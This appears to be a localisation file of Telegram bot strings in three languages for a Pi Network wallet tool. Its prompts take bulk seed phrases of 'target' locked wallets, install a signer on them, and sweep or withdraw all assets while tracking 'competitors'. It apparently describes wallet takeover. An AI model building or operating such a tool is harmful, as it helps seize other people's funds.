        deleteServer: "🗑️ Padam Server",
        manageFunding: "💰 Wallet Funding",
        noFundingWallet: "Belum ada wallet funding.",
        addFunding: "➕ Tambah Funding",
        addFundingFirst: "➕ Tambah Funding dulu",
        deleteFunding: "🗑️ Padam Funding",
        publicKey: "Public",
        balance: "Baki",
        id: "ID",
        manageDestinations: "🎯 Wallet Tujuan",
        noDestinations: "Belum ada wallet tujuan.",
        addDestination: "➕ Tambah Wallet Tujuan",
        deleteDestination: "🗑️ Padam Wallet Tujuan",
        manageWorkers: "👷 Urus Worker",
        noWorkers: "Belum ada worker.",
        unassigned: "Belum dipilih",
        addWorker: "➕ Tambah Worker",
        deleteWorker: "🗑️ Padam Worker",
        noBots: "Belum ada bot TX.",
        setNewBot: "➕ Set Bot Baharu",
        advancedJson: "🧩 JSON Lanjutan",
        deleteBot: "🗑️ Padam Bot",
        moreBots: "bot lain",
        parent: "Parent",
        status: "Status",
        type: "Jenis",
        mode: "Mode",
        amount: "Amount",
        network: "Network",
        time: "Masa",
        feeLoss: "Fee Loss",
        fundingHistoryTitle: "📊 Sejarah Mutasi Funding",
        totalMutations: "Jumlah mutasi",
        totalLoss: "Jumlah loss",
        noHistory: "Belum ada sejarah.",
        botGroup: "Bot/Group",
        workersLabel: "Workers",
        deducted: "Terpotong",
        ledgerTitle: "🔎 Semak Ledger",
        ledgerIntro: "Fungsi ini sama seperti menu Check Ledger di web.",
        ledgerAutoInfo: "Auto Detect = bot ambil 10 ledger terakhir daripada transaksi wallet.",
        ledgerManualInfo: "Manual Range = admin isi ledger start dan ledger end sendiri.",
        autoDetectLedger: "🔎 Auto Detect Ledger",
        manualLedgerRange: "✍️ Manual Ledger Range",
        logsTitle: "📜 Live Logs",
        logsIntro: "Memaparkan 40 log terakhir daripada proses bot/worker.",
        noLogs: "Belum ada log.",
        refreshLogs: "🔄 Refresh Logs",
        multisigTitle: "🔐 Kawalan Penuh Multisig",
        lockedWallet: "Locked wallet",
        pendingLock: "Pending lock",
        savedWalletList: "Saved Wallet List",
        savedWalletPhraseList: "Senarai Phrase Wallet Tersimpan",
        saveWalletList: "💾 Save Wallet List",
        runSavedBatch: "🚀 Run Saved Batch",
        manageSavedWallets: "📦 Senarai Wallet Tersimpan",
        deleteAllSavedWallets: "🗑️ Padam Semua Wallet",
        addSavedWallet: "➕ Save Wallet",
        noSavedWallet: "Belum ada wallet tersimpan.",
        savedWalletIntro: "Phrase disimpan terenkripsi dan tidak akan dipadam selepas Run Batch.",
        deleteOneByOne: "Padam satu per satu",
        defaultTimezone: "Zon masa lalai",
        multisigIntro: "Semua operasi dijalankan dari Telegram berdasarkan Chat ID admin.",
        runSetMode: "➕ Jalankan / Set Mode",
        withdrawAllAssets: "💸 Tarik Semua Aset",
        sweepAll: "🧹 Sweep All",
        removeAllSigner: "🧹 Hapus Semua Signer",
        locked: "📋 Locked",
        pending: "⏳ Pending",
        protocolMainnet: "🧭 Protocol Mainnet",
        protocolTestnet: "🧪 Protocol Testnet",
        openingHome: "Membuka menu utama...",
        chatNotAllowed: "Chat tidak diizinkan",
        typeMenuHint: "Ketik /menu untuk membuka tombol kawalan.",
        inputCancelled: "Input dibatalkan.",
    },
};

const TELEGRAM_PROMPT_TEXT = {
    id: {
        inputEmpty: "Input kosong. Silakan kirim ulang.",
        serverAdded: "✅ Server ditambahkan",
        destinationAdded: "✅ Wallet tujuan ditambahkan",
        fundingAdded: "✅ Funding wallet ditambahkan",
        fundingSecretDeleted: "Pesan berisi phrase sudah dicoba dihapus dari chat.",
        workerAdded: "✅ Worker ditambahkan",
        ledgerRangePrompt: "Kirim range ledger:\n<code>START|END</code>\n\nContoh:\n<code>28120785|28120795</code>\n\nUntuk 1 ledger saja kirim:\n<code>28120785</code>",
        autoDetectProgress: "⏳ Auto detect ledger dan scan data. Tunggu sampai selesai...",
        scanLedgerProgress: "⏳ Scan ledger {range}. Tunggu sampai selesai...",
        submitBeforeSaved: "✅ Submit Before disimpan",
        telegramSettingsSaved: "✅ Telegram settings disimpan",
        botTxCreated: "✅ Bot TX dibuat",
        base: "Base",
        failed: "❌ Gagal",
        ledgerWalletPrompt: "Kirim Wallet Address Claim untuk Check Ledger.\nContoh:\n<code>GXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code>",
        scanExpired: "Data scan sudah expired. Silakan Check Ledger ulang.",
        ledgerRescanProgress: "⏳ Scan ulang ledger. Tunggu sampai selesai...",
        ledgerExcelProgress: "⏳ Membuat file Excel ledger dan mengirim ke Telegram. Tunggu sampai selesai...",
        ledgerExcelSent: "File Excel dikirim",
        ledgerExcelError: "❌ Gagal membuat/mengirim Excel ledger",
        submitBeforePrompt: "Kirim angka SUBMIT_BEFORE_MS (0-60000).\nContoh: <code>2500</code>",
        telegramSettingsPrompt: "Kirim format:\n<code>BOT_TOKEN|CHAT_ID</code>\n\nUntuk tetap pakai token lama:\n<code>__KEEP__|CHAT_ID</code>",
        addServerPrompt: "Kirim format server:\n<code>Nama|https://url-horizon|Lokasi</code>\nContoh:\n<code>SGP1|https://api.mainnet.minepi.com|Singapore</code>",
        addDestinationPrompt: "Kirim format wallet tujuan:\n<code>Nama|PUBLIC_KEY_TUJUAN</code>",
        addFundingPrompt: "Kirim format funding wallet:\n<code>Nama|mnemonic/passphrase</code>\n\nBot akan mencoba menghapus pesan berisi phrase setelah diproses.",
        addWorkerPrompt: "Kirim nama worker baru.\nContoh: <code>Worker1</code>",
        addBotJsonPrompt: "Kirim JSON bot lengkap seperti ini:",
        inputEmptyFileHint: "Input kosong. Silakan kirim teks atau file .txt lalu ulangi.",
        targetPhrasesPrompt: "<b>Targets</b>\nKirim phrase locked wallet per baris, atau upload file .txt berisi phrase per baris.\nBot akan mencoba menghapus pesan/file setelah diproses.",
        targetPublicKeysPrompt: "Kirim public key target per baris, atau upload file .txt berisi public key per baris.\nContoh:\n<code>GAAAA...\nGBBBB...</code>",
        targetPhraseRequired: "Target phrase wajib diisi",
        targetPublicKeyRequired: "Target public key wajib diisi",
        targetTooMany: "Target terlalu banyak. Maksimal {max} baris per file/input",
        targetFileReceived: "📄 File diterima: <b>{filename}</b>\nTarget terbaca: <b>{count}</b> {kind}.",
        targetFileInvalid: "File harus format .txt berisi satu phrase/public key per baris",
        targetFileInvalidTelegram: "File Telegram tidak valid",
        targetFilePathFailed: "Gagal mengambil path file dari Telegram",
        targetFileTooLarge: "File terlalu besar. Maksimal {max}MB",
        saveWalletPrompt: "<b>💾 Save Wallet List</b>\nKirim phrase locked wallet per baris, atau upload file .txt berisi phrase per baris.\n\nMode ini hanya menyimpan wallet ke list, belum menjalankan multisig.",
        savedWalletDone: "✅ Save Wallet List selesai\nTotal input: <b>{total}</b>\nBaru: <b>{added}</b> | Update: <b>{updated}</b> | Gagal: <b>{failed}</b>",
        savedWalletEmpty: "Tidak ada phrase wallet untuk disimpan.",
        savedWalletRunEmpty: "Saved Wallet List masih kosong. Save wallet dulu sebelum Run Saved Batch.",
        savedWalletDeleted: "✅ Wallet dihapus dari Saved Wallet List",
        savedWalletDeleteAllConfirm: "Yakin hapus semua wallet dari Saved Wallet List?",
        savedWalletDeleteAllDone: "✅ Semua wallet tersimpan sudah dihapus: {count}",
        savedWalletLoadedForRun: "Saved Wallet List dipakai sebagai target batch",
        multisigRunStarting: "⏳ Menjalankan multisig dari Saved Wallet List. Tunggu sampai selesai...",
        multisigRunManualStarting: "⏳ Menjalankan multisig. Tunggu sampai selesai...",
        multisigRunPreparing: "🔎 Validasi target wallet...",
        multisigRunProtocol: "🧭 Cek protocol jaringan...",
        multisigRunQueued: "⏳ Protocol belum ready. Target valid disimpan ke pending queue.",
        multisigRunBatchStarting: "🚀 Menjalankan batch {batch_no}/{batch_count}...",
        multisigRunBatchDone: "✅ Batch {batch_no}/{batch_count} selesai.",
        multisigRunDelay: "⏸️ Delay sebelum batch berikutnya...",
        multisigRunCompleted: "✅ Multisig selesai diproses.",
        multisigRunStopped: "🛑 Batch dihentikan oleh admin.",
        stopBatch: "⛔ Stop Batch",
        stopBatchRequested: "🛑 Stop diminta. Bot akan berhenti setelah batch/transaksi yang sedang berjalan selesai.",
        watchSignerAutoInstall: "🔁 Watch Signer Auto Install",
        setSignerTestWallet: "🧪 Set Test Wallet",
        stopBatchInstallLock: "⛔ Stop Batch Install Lock",
        signerWatchTitle: "🔁 Watch Signer Mainnet",
        signerWatchTestPhrasePrompt: "Kirim 1 phrase khusus untuk test signer mainnet. Phrase ini terpisah dari Saved Wallet List. Bot akan mencoba menghapus pesan setelah diproses.",
        signerWatchTestPhraseSaved: "✅ Test phrase signer disimpan",
        signerWatchSignerReadyAutoRun: "✅ Signer mainnet sudah aktif. Bot menjalankan Install Lock otomatis dari Saved Wallet List.",
        progressSource: "Sumber",
        progressTargets: "Targets",
        progressValid: "Valid",
        progressProcessed: "Diproses",
        progressSuccess: "Berhasil",
        progressFailed: "Gagal",
        progressBatchSize: "Isi batch",
        progressBatchMode: "Mode batch",
        progressBatchModeIsolated: "Per wallet terpisah",
        progressBatchModeParallelIsolated: "Paralel per wallet terpisah",
        progressDelay: "Delay",
        saveOnlyButton: "💾 Save Only ke List",
        phraseKind: "phrase",
        publicKeyKind: "public key",
    },
    en: {
        inputEmpty: "Input is empty. Please send it again.",
        serverAdded: "✅ Server added",
        destinationAdded: "✅ Destination wallet added",
        fundingAdded: "✅ Funding wallet added",
        fundingSecretDeleted: "The message containing the phrase was deleted from chat if possible.",
        workerAdded: "✅ Worker added",
        ledgerRangePrompt: "Send ledger range:\n<code>START|END</code>\n\nExample:\n<code>28120785|28120795</code>\n\nFor one ledger only, send:\n<code>28120785</code>",
        autoDetectProgress: "⏳ Auto-detecting ledger and scanning data. Please wait...",
        scanLedgerProgress: "⏳ Scanning ledger {range}. Please wait...",
        submitBeforeSaved: "✅ Submit Before saved",
        telegramSettingsSaved: "✅ Telegram settings saved",
        botTxCreated: "✅ TX Bot created",
        base: "Base",
        failed: "❌ Failed",
        ledgerWalletPrompt: "Send the Claim Wallet Address for Check Ledger.\nExample:\n<code>GXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code>",
        scanExpired: "Scan data has expired. Please run Check Ledger again.",
        ledgerRescanProgress: "⏳ Rescanning ledger. Please wait...",
        ledgerExcelProgress: "⏳ Creating the ledger Excel file and sending it to Telegram. Please wait...",
        ledgerExcelSent: "Excel file sent",
        ledgerExcelError: "❌ Failed to create/send ledger Excel",
        submitBeforePrompt: "Send SUBMIT_BEFORE_MS value (0-60000).\nExample: <code>2500</code>",
        telegramSettingsPrompt: "Send this format:\n<code>BOT_TOKEN|CHAT_ID</code>\n\nTo keep the old token:\n<code>__KEEP__|CHAT_ID</code>",
        addServerPrompt: "Send server format:\n<code>Name|https://horizon-url|Location</code>\nExample:\n<code>SGP1|https://api.mainnet.minepi.com|Singapore</code>",
        addDestinationPrompt: "Send destination wallet format:\n<code>Name|DESTINATION_PUBLIC_KEY</code>",
        addFundingPrompt: "Send funding wallet format:\n<code>Name|mnemonic/passphrase</code>\n\nThe bot will try to delete the phrase message after processing.",
        addWorkerPrompt: "Send the new worker name.\nExample: <code>Worker1</code>",
        addBotJsonPrompt: "Send full bot JSON like this:",
        inputEmptyFileHint: "Input is empty. Please send text or a .txt file and try again.",
        targetPhrasesPrompt: "<b>Targets</b>\nSend locked-wallet phrases, one per line, or upload a .txt file with one phrase per line.\nThe bot will try to delete the message/file after processing.",
        targetPublicKeysPrompt: "Send target public keys, one per line, or upload a .txt file with one public key per line.\nExample:\n<code>GAAAA...\nGBBBB...</code>",
        targetPhraseRequired: "Target phrase is required",
        targetPublicKeyRequired: "Target public key is required",
        targetTooMany: "Too many targets. Maximum {max} lines per file/input",
        targetFileReceived: "📄 File received: <b>{filename}</b>\nTargets read: <b>{count}</b> {kind}.",
        targetFileInvalid: "File must be a .txt file with one phrase/public key per line",
        targetFileInvalidTelegram: "Invalid Telegram file",
        targetFilePathFailed: "Failed to get file path from Telegram",
        targetFileTooLarge: "File is too large. Maximum {max}MB",
        saveWalletPrompt: "<b>💾 Save Wallet List</b>\nSend locked-wallet phrases, one per line, or upload a .txt file with one phrase per line.\n\nThis mode only saves wallets to the list and does not run multisig yet.",
        savedWalletDone: "✅ Save Wallet List completed\nTotal input: <b>{total}</b>\nNew: <b>{added}</b> | Updated: <b>{updated}</b> | Failed: <b>{failed}</b>",
        savedWalletEmpty: "No wallet phrases to save.",
        savedWalletRunEmpty: "Saved Wallet List is empty. Save wallets before running Saved Batch.",
        savedWalletDeleted: "✅ Wallet deleted from Saved Wallet List",
        savedWalletDeleteAllConfirm: "Delete all wallets from Saved Wallet List?",
        savedWalletDeleteAllDone: "✅ All saved wallets deleted: {count}",
        savedWalletLoadedForRun: "Saved Wallet List is used as the batch target",
        multisigRunStarting: "⏳ Running multisig from Saved Wallet List. Please wait until it finishes...",
        multisigRunManualStarting: "⏳ Running multisig. Please wait until it finishes...",
        multisigRunPreparing: "🔎 Validating target wallets...",
        multisigRunProtocol: "🧭 Checking network protocol...",
        multisigRunQueued: "⏳ Protocol is not ready. Valid targets were saved to the pending queue.",
        multisigRunBatchStarting: "🚀 Running batch {batch_no}/{batch_count}...",
        multisigRunBatchDone: "✅ Batch {batch_no}/{batch_count} completed.",
        multisigRunDelay: "⏸️ Waiting before the next batch...",
        multisigRunCompleted: "✅ Multisig processing completed.",
        multisigRunStopped: "🛑 Batch stopped by admin.",
        stopBatch: "⛔ Stop Batch",
        stopBatchRequested: "🛑 Stop requested. The bot will stop after the current batch/transaction finishes.",
        watchSignerAutoInstall: "🔁 Watch Signer Auto Install",
        setSignerTestWallet: "🧪 Set Test Wallet",
        stopBatchInstallLock: "⛔ Stop Install Lock Batch",
        signerWatchTitle: "🔁 Watch Mainnet Signer",
        signerWatchTestPhrasePrompt: "Send exactly 1 phrase for the mainnet signer test. This phrase is separate from the Saved Wallet List. The bot will try to delete the message after processing.",
        signerWatchTestPhraseSaved: "✅ Signer test phrase saved",
        signerWatchSignerReadyAutoRun: "✅ Mainnet signer is active. The bot is running Install Lock automatically from the Saved Wallet List.",
        progressSource: "Source",
        progressTargets: "Targets",
        progressValid: "Valid",
        progressProcessed: "Processed",
        progressSuccess: "Success",
        progressFailed: "Failed",
        progressBatchSize: "Batch size",
        progressBatchMode: "Batch mode",
        progressBatchModeIsolated: "Per-wallet isolated",
        progressBatchModeParallelIsolated: "Parallel per-wallet isolated",
        progressDelay: "Delay",
        saveOnlyButton: "💾 Save Only to List",
        phraseKind: "phrases",
        publicKeyKind: "public keys",
    },
    ms: {
        inputEmpty: "Input kosong. Sila hantar semula.",
        serverAdded: "✅ Server ditambah",
        destinationAdded: "✅ Wallet tujuan ditambah",
        fundingAdded: "✅ Wallet funding ditambah",
        fundingSecretDeleted: "Pesan yang mengandungi phrase sudah dicuba dipadam dari chat.",
        workerAdded: "✅ Worker ditambah",
        ledgerRangePrompt: "Kirim julat ledger:\n<code>START|END</code>\n\nContoh:\n<code>28120785|28120795</code>\n\nUntuk 1 ledger sahaja kirim:\n<code>28120785</code>",
        autoDetectProgress: "⏳ Auto detect ledger dan scan data. Sila tunggu...",
        scanLedgerProgress: "⏳ Scan ledger {range}. Sila tunggu...",
        submitBeforeSaved: "✅ Submit Before disimpan",
        telegramSettingsSaved: "✅ Tetapan Telegram disimpan",
        botTxCreated: "✅ Bot TX dibuat",
        base: "Base",
        failed: "❌ Gagal",
        ledgerWalletPrompt: "Kirim Wallet Address Claim untuk Semak Ledger.\nContoh:\n<code>GXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code>",
        scanExpired: "Data scan sudah tamat tempoh. Sila Semak Ledger semula.",
        ledgerRescanProgress: "⏳ Scan ulang ledger. Sila tunggu...",
        ledgerExcelProgress: "⏳ Membuat fail Excel ledger dan menghantar ke Telegram. Sila tunggu...",
        ledgerExcelSent: "Fail Excel dihantar",
        ledgerExcelError: "❌ Gagal membuat/menghantar Excel ledger",
        submitBeforePrompt: "Kirim angka SUBMIT_BEFORE_MS (0-60000).\nContoh: <code>2500</code>",
        telegramSettingsPrompt: "Kirim format:\n<code>BOT_TOKEN|CHAT_ID</code>\n\nUntuk tetap pakai token lama:\n<code>__KEEP__|CHAT_ID</code>",
        addServerPrompt: "Kirim format server:\n<code>Nama|https://url-horizon|Lokasi</code>\nContoh:\n<code>SGP1|https://api.mainnet.minepi.com|Singapore</code>",
        addDestinationPrompt: "Kirim format wallet tujuan:\n<code>Nama|PUBLIC_KEY_TUJUAN</code>",
        addFundingPrompt: "Kirim format wallet funding:\n<code>Nama|mnemonic/passphrase</code>\n\nBot akan cuba memadam mesej phrase selepas diproses.",
        addWorkerPrompt: "Kirim nama worker baharu.\nContoh: <code>Worker1</code>",
        addBotJsonPrompt: "Kirim JSON bot lengkap seperti ini:",
        inputEmptyFileHint: "Input kosong. Sila hantar teks atau fail .txt dan ulang semula.",
        targetPhrasesPrompt: "<b>Targets</b>\nKirim phrase locked wallet per baris, atau upload fail .txt berisi phrase per baris.\nBot akan cuba memadam mesej/fail selepas diproses.",
        targetPublicKeysPrompt: "Kirim public key target per baris, atau upload fail .txt berisi public key per baris.\nContoh:\n<code>GAAAA...\nGBBBB...</code>",
        targetPhraseRequired: "Target phrase wajib diisi",
        targetPublicKeyRequired: "Target public key wajib diisi",
        targetTooMany: "Target terlalu banyak. Maksimum {max} baris per fail/input",
        targetFileReceived: "📄 Fail diterima: <b>{filename}</b>\nTarget dibaca: <b>{count}</b> {kind}.",
        targetFileInvalid: "Fail mesti format .txt dengan satu phrase/public key per baris",
        targetFileInvalidTelegram: "Fail Telegram tidak valid",
        targetFilePathFailed: "Gagal mengambil path fail dari Telegram",
        targetFileTooLarge: "Fail terlalu besar. Maksimum {max}MB",
        saveWalletPrompt: "<b>💾 Save Wallet List</b>\nKirim phrase locked wallet per baris, atau upload fail .txt berisi phrase per baris.\n\nMode ini hanya menyimpan wallet ke senarai, belum menjalankan multisig.",
        savedWalletDone: "✅ Save Wallet List selesai\nJumlah input: <b>{total}</b>\nBaru: <b>{added}</b> | Update: <b>{updated}</b> | Gagal: <b>{failed}</b>",
        savedWalletEmpty: "Tiada phrase wallet untuk disimpan.",
        savedWalletRunEmpty: "Saved Wallet List masih kosong. Save wallet dulu sebelum Run Saved Batch.",
        savedWalletDeleted: "✅ Wallet dipadam dari Saved Wallet List",
        savedWalletDeleteAllConfirm: "Yakin padam semua wallet dari Saved Wallet List?",
        savedWalletDeleteAllDone: "✅ Semua wallet tersimpan sudah dipadam: {count}",
        savedWalletLoadedForRun: "Saved Wallet List dipakai sebagai target batch",
        multisigRunStarting: "⏳ Menjalankan multisig dari Saved Wallet List. Sila tunggu sampai selesai...",
        multisigRunManualStarting: "⏳ Menjalankan multisig. Sila tunggu sampai selesai...",
        multisigRunPreparing: "🔎 Validasi target wallet...",
        multisigRunProtocol: "🧭 Semak protocol jaringan...",
        multisigRunQueued: "⏳ Protocol belum ready. Target valid disimpan ke pending queue.",
        multisigRunBatchStarting: "🚀 Menjalankan batch {batch_no}/{batch_count}...",
        multisigRunBatchDone: "✅ Batch {batch_no}/{batch_count} selesai.",
        multisigRunDelay: "⏸️ Delay sebelum batch berikutnya...",
        multisigRunCompleted: "✅ Multisig selesai diproses.",
        multisigRunStopped: "🛑 Batch dihentikan oleh admin.",
        stopBatch: "⛔ Stop Batch",
        stopBatchRequested: "🛑 Stop diminta. Bot akan berhenti selepas batch/transaksi yang sedang berjalan selesai.",
        watchSignerAutoInstall: "🔁 Watch Signer Auto Install",
        setSignerTestWallet: "🧪 Set Test Wallet",
        stopBatchInstallLock: "⛔ Stop Batch Install Lock",
        signerWatchTitle: "🔁 Watch Signer Mainnet",
        signerWatchTestPhrasePrompt: "Kirim 1 phrase khas untuk test signer mainnet. Phrase ini berasingan daripada Saved Wallet List. Bot akan cuba memadam mesej selepas diproses.",
        signerWatchTestPhraseSaved: "✅ Test phrase signer disimpan",
        signerWatchSignerReadyAutoRun: "✅ Signer mainnet sudah aktif. Bot menjalankan Install Lock automatik daripada Saved Wallet List.",
        progressSource: "Sumber",
        progressTargets: "Targets",
        progressValid: "Valid",
        progressProcessed: "Diproses",
        progressSuccess: "Berjaya",
        progressFailed: "Gagal",
        progressBatchSize: "Isi batch",
        progressBatchMode: "Mode batch",
        progressBatchModeIsolated: "Per wallet terpisah",
        progressBatchModeParallelIsolated: "Selari per wallet terpisah",
        progressDelay: "Delay",
        saveOnlyButton: "💾 Save Only ke List",
        phraseKind: "phrase",
        publicKeyKind: "public key",
    },
};

Object.assign(TELEGRAM_LANGUAGE_TEXT.id, {
    pageLabel: "Halaman",
    previousButton: "⬅️ Prev",
    nextButton: "Next ➡️",
});
Object.assign(TELEGRAM_LANGUAGE_TEXT.en, {
    pageLabel: "Page",
    previousButton: "⬅️ Prev",
    nextButton: "Next ➡️",
});
Object.assign(TELEGRAM_LANGUAGE_TEXT.ms, {
    pageLabel: "Halaman",
    previousButton: "⬅️ Prev",
    nextButton: "Seterusnya ➡️",
});


Object.assign(TELEGRAM_LANGUAGE_TEXT.id, {
    bumpWallets: "🧾 Bump Wallet",
    manageBump: "💼 Manage Bump",
    noBumpWallet: "Belum ada wallet di bump.txt.",
    addBumpWallet: "➕ Add Bump",
    uploadBumpTxt: "📤 Upload bump.txt",
    showBumpWallet: "👁️ Show Bump",
    deleteOneBumpWallet: "🗑️ Delete 1 Bump",
    deleteAllBumpWallet: "🧹 Delete All Bump",
});
Object.assign(TELEGRAM_LANGUAGE_TEXT.en, {
    bumpWallets: "🧾 Bump Wallets",
    manageBump: "💼 Manage Bump",
    noBumpWallet: "No wallets in bump.txt yet.",
    addBumpWallet: "➕ Add Bump",
    uploadBumpTxt: "📤 Upload bump.txt",
    showBumpWallet: "👁️ Show Bump",
    deleteOneBumpWallet: "🗑️ Delete 1 Bump",
    deleteAllBumpWallet: "🧹 Delete All Bump",
});
Object.assign(TELEGRAM_LANGUAGE_TEXT.ms, {
    bumpWallets: "🧾 Wallet Bump",
    manageBump: "💼 Urus Bump",
    noBumpWallet: "Belum ada wallet dalam bump.txt.",
    addBumpWallet: "➕ Tambah Bump",
    uploadBumpTxt: "📤 Upload bump.txt",
    showBumpWallet: "👁️ Papar Bump",
    deleteOneBumpWallet: "🗑️ Padam 1 Bump",
    deleteAllBumpWallet: "🧹 Padam Semua Bump",
});

Object.assign(TELEGRAM_PROMPT_TEXT.id, {
    loadingKeepOpen: "Mohon tunggu, proses sedang berjalan. Jangan tutup menu ini.",
    loadingElapsed: "Berjalan",
    loadingEta: "Estimasi sisa",
    loadingProgress: "Progress",
    loadingUnknown: "menghitung...",
    loadingSavedWallets: "⏳ Menyimpan Saved Wallet List...",
    loadingGeneratingExcel: "⏳ Membuat file Excel ledger...",
    loadingLedgerRescan: "⏳ Men-scan ulang ledger...",
    loadingAutoDetectSubtext: "Bot sedang mendeteksi range ledger dan memproses data transaksi.",
    loadingManualScanSubtext: "Bot sedang memproses data transaksi pada range ledger yang dipilih.",
    loadingExcelSubtext: "Bot sedang membuat file Excel dan menyiapkan pengiriman ke Telegram.",
    ledgerCompleteTitle: "✅ Check Ledger selesai",
    ledgerTopCompetitorTitle: "Top Competitor / Send",
    ledgerClaimOnlyTitle: "Claim Only",
    ledgerFirstLogsTitle: "Log TX pertama",
    ledgerNoCompetitor: "Tidak ada data competitor/send.",
    ledgerNoClaimOnly: "Tidak ada data claim only.",
    ledgerNoLogs: "Tidak ada transaksi yang cocok di range ini.",
    ledgerMoreLogs: "...dan {count} log lain. Pakai Download Excel untuk data lengkap.",
    downloadExcelButton: "📥 Download Excel",
    rescanButton: "🔄 Scan Ulang",
    checkAnotherButton: "🔎 Check Lain",
    savedWalletSavingDone: "✅ Saved Wallet List berhasil disimpan",
    signerWallet: "✍️ Signer Wallet",
    addSigner: "➕ Add Signer",
    manageSigners: "✍️ Signer Wallets",
    noSignerWallet: "Belum ada signer wallet.",
    deleteSigner: "🗑️ Delete Signer",
    signerAdded: "✅ Signer Wallet ditambahkan",
    signerDeleted: "✅ Signer Wallet dihapus",
    signerDeleteAllConfirm: "Yakin hapus semua Signer Wallet?",
    signerDeleteAllDone: "✅ Semua Signer Wallet dihapus: {count}",
    addSignerPrompt: "Kirim format signer:\n<code>Nama|mnemonic/passphrase</code>\n\nPhrase signer boleh belum aktif mainnet. Bot akan mencoba menghapus pesan phrase setelah diproses.",
    chooseSignerTitle: "✍️ Pilih Signer Wallet",
    chooseSignerPrompt: "Funding hanya bayar fee/fee bump. Signer ini yang akan dipasang ke target dan dipakai menandatangani transaksi target.",
    addSignerFirst: "➕ Add Signer dulu",
});
Object.assign(TELEGRAM_PROMPT_TEXT.en, {
    loadingKeepOpen: "Please wait. The process is running. Keep this menu open.",
    loadingElapsed: "Elapsed",
    loadingEta: "Estimated remaining",
    loadingProgress: "Progress",
    loadingUnknown: "calculating...",
    loadingSavedWallets: "⏳ Saving the Saved Wallet List...",
    loadingGeneratingExcel: "⏳ Creating the ledger Excel file...",
    loadingLedgerRescan: "⏳ Rescanning the ledger...",
    loadingAutoDetectSubtext: "The bot is detecting the ledger range and processing transaction data.",
    loadingManualScanSubtext: "The bot is processing transaction data for the selected ledger range.",
    loadingExcelSubtext: "The bot is creating the Excel file and preparing it for Telegram delivery.",
    ledgerCompleteTitle: "✅ Check Ledger completed",
    ledgerTopCompetitorTitle: "Top Competitor / Send",
    ledgerClaimOnlyTitle: "Claim Only",
    ledgerFirstLogsTitle: "First TX logs",
    ledgerNoCompetitor: "No competitor/send data found.",
    ledgerNoClaimOnly: "No claim-only data found.",
    ledgerNoLogs: "No matching transactions were found in this range.",
    ledgerMoreLogs: "...and {count} more logs. Use Download Excel for the full data.",
    downloadExcelButton: "📥 Download Excel",
    rescanButton: "🔄 Rescan",
    checkAnotherButton: "🔎 Check Another",
    savedWalletSavingDone: "✅ Saved Wallet List saved successfully",
    signerWallet: "✍️ Signer Wallet",
    addSigner: "➕ Add Signer",
    manageSigners: "✍️ Signer Wallets",
    noSignerWallet: "No signer wallets yet.",
    deleteSigner: "🗑️ Delete Signer",
    signerAdded: "✅ Signer Wallet added",
    signerDeleted: "✅ Signer Wallet deleted",
    signerDeleteAllConfirm: "Delete all Signer Wallets?",
    signerDeleteAllDone: "✅ All Signer Wallets deleted: {count}",
    addSignerPrompt: "Send signer format:\n<code>Name|mnemonic/passphrase</code>\n\nThe signer phrase can be inactive on mainnet. The bot will try to delete the phrase message after processing.",
    chooseSignerTitle: "✍️ Choose Signer Wallet",
    chooseSignerPrompt: "Funding only pays fee/fee bump. This signer will be installed on the target and used to sign target transactions.",
    addSignerFirst: "➕ Add Signer first",
});
Object.assign(TELEGRAM_PROMPT_TEXT.ms, {
    loadingKeepOpen: "Sila tunggu. Proses sedang berjalan. Jangan tutup menu ini.",
    loadingElapsed: "Tempoh berjalan",
    loadingEta: "Anggaran baki",
    loadingProgress: "Kemajuan",
    loadingUnknown: "mengira...",
    loadingSavedWallets: "⏳ Menyimpan Saved Wallet List...",
    loadingGeneratingExcel: "⏳ Menjana fail Excel ledger...",
    loadingLedgerRescan: "⏳ Mengimbas semula ledger...",
    loadingAutoDetectSubtext: "Bot sedang mengesan julat ledger dan memproses data transaksi.",
    loadingManualScanSubtext: "Bot sedang memproses data transaksi untuk julat ledger yang dipilih.",
    loadingExcelSubtext: "Bot sedang menjana fail Excel dan menyediakan penghantaran ke Telegram.",
    ledgerCompleteTitle: "✅ Semakan Ledger selesai",
    ledgerTopCompetitorTitle: "Pesaing Teratas / Hantar",
    ledgerClaimOnlyTitle: "Tuntut Sahaja",
    ledgerFirstLogsTitle: "Log TX pertama",
    ledgerNoCompetitor: "Tiada data pesaing/hantar.",
    ledgerNoClaimOnly: "Tiada data tuntut sahaja.",
    ledgerNoLogs: "Tiada transaksi sepadan ditemui dalam julat ini.",
    ledgerMoreLogs: "...dan {count} log lagi. Gunakan Download Excel untuk data penuh.",
    downloadExcelButton: "📥 Muat Turun Excel",
    rescanButton: "🔄 Imbas Semula",
    checkAnotherButton: "🔎 Semak Lagi",
    savedWalletSavingDone: "✅ Saved Wallet List berjaya disimpan",
    signerWallet: "✍️ Signer Wallet",
    addSigner: "➕ Add Signer",
    manageSigners: "✍️ Signer Wallets",
    noSignerWallet: "Belum ada signer wallet.",
    deleteSigner: "🗑️ Padam Signer",
    signerAdded: "✅ Signer Wallet ditambah",
    signerDeleted: "✅ Signer Wallet dipadam",
    signerDeleteAllConfirm: "Yakin padam semua Signer Wallet?",
    signerDeleteAllDone: "✅ Semua Signer Wallet dipadam: {count}",
    addSignerPrompt: "Kirim format signer:\n<code>Nama|mnemonic/passphrase</code>\n\nPhrase signer boleh belum aktif mainnet. Bot akan cuba memadam mesej phrase selepas diproses.",
    chooseSignerTitle: "✍️ Pilih Signer Wallet",
    chooseSignerPrompt: "Funding hanya bayar fee/fee bump. Signer ini yang akan dipasang pada target dan dipakai menandatangani transaksi target.",
    addSignerFirst: "➕ Add Signer dulu",
});


Object.assign(TELEGRAM_PROMPT_TEXT.id, {
    addBumpPrompt: "Kirim phrase bump wallet per baris. Bot akan menampilkan public key, menyimpan ke bump.txt, lalu restart worker PM2 supaya file termuat ulang.\n\nPesan berisi phrase akan dicoba dihapus setelah diproses.",
    uploadBumpPrompt: "Upload file .txt berisi phrase bump wallet. 1 baris = 1 phrase. Bot akan merge + dedupe ke bump.txt lalu restart worker PM2.",
    bumpAdded: "✅ Bump wallet diproses",
    bumpDeleted: "✅ Bump wallet dihapus",
    bumpDeleteAllConfirm: "Yakin hapus semua wallet di bump.txt?",
